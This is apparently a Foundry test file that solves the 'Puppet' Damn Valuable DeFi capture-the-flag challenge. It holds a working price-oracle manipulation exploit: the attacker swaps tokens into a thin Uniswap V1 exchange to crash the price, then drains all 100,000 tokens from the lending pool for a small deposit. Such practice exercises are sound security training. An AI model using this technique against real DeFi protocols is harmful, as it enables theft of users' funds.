// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utilities} from "../../utils/Utilities.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";

interface UniswapV1Exchange {
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    ) external payable returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);

    function getTokenToEthInputPrice(
        uint256 tokens_sold
    ) external view returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract Puppet is Test {
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INIITTIAL_TOKEB_BALANCE = 100_000e18;
    uint256 constant DEADLINE = 10_000_000;

    UniswapV1Exchange uniswapV1ExchangeTemplate;
    UniswapV1Exchange uniswapV1Exchange;
    UniswapV1Factory uniswapV1Factory;

    DamnValuableToken dvt;
    PuppetPool pool;
    address payable attacker;

    function setUp() public {
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);

        uniswapV1Factory = UniswapV1Factory(
            deployCode("./src/build-uniswap/v1/UniswapV1Factory.json")
        );

        uniswapV1ExchangeTemplate = UniswapV1Exchange(
            deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json")
        );

        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        uniswapV1Exchange = UniswapV1Exchange(
            uniswapV1Factory.createExchange(address(dvt))
        );

        vm.label(address(uniswapV1Exchange), "Uniswap Exchange");

        pool = new PuppetPool(address(dvt), address(uniswapV1Exchange));
        vm.label(address(pool), "Puppet Pool");
        dvt.transfer(address(pool), POOL_INIITTIAL_TOKEB_BALANCE);

        dvt.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0,
            UNISWAP_INITIAL_TOKEN_RESERVE,
            DEADLINE
        );

        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
    }

    function testExploit() public {
        vm.startPrank(attacker);
        dvt.approve(address(uniswapV1Exchange), ATTACKER_INITIAL_TOKEN_BALANCE);
        // Swap DVT for almost all ETH in the Exchange
        console.log("ETH before swap:", attacker.balance);
        uniswapV1Exchange.tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            9e18,
            DEADLINE
        );
        console.log("ETH after swap:", attacker.balance);

        // now we have to pay only ~19.6 ether for 100000 DVT
        console.log(
            "ETH to pay:",
            pool.calculateDepositRequired(POOL_INIITTIAL_TOKEB_BALANCE)
        );
        uint256 depositRequired = pool.calculateDepositRequired(
            POOL_INIITTIAL_TOKEB_BALANCE
        );

        pool.borrow{value: depositRequired}(
            POOL_INIITTIAL_TOKEB_BALANCE,
            attacker
        );
        console.log("ETH after borrow:", attacker.balance);
        validation();
    }

    function validation() public {
        // Attacker has taken all tokens from the pool
        assertGe(dvt.balanceOf(attacker), POOL_INIITTIAL_TOKEB_BALANCE);
        assertEq(dvt.balanceOf(address(pool)), 0);
    }

    function calculateTokenToEthInputPrice(
        uint256 input_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) internal pure returns (uint256) {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }
}
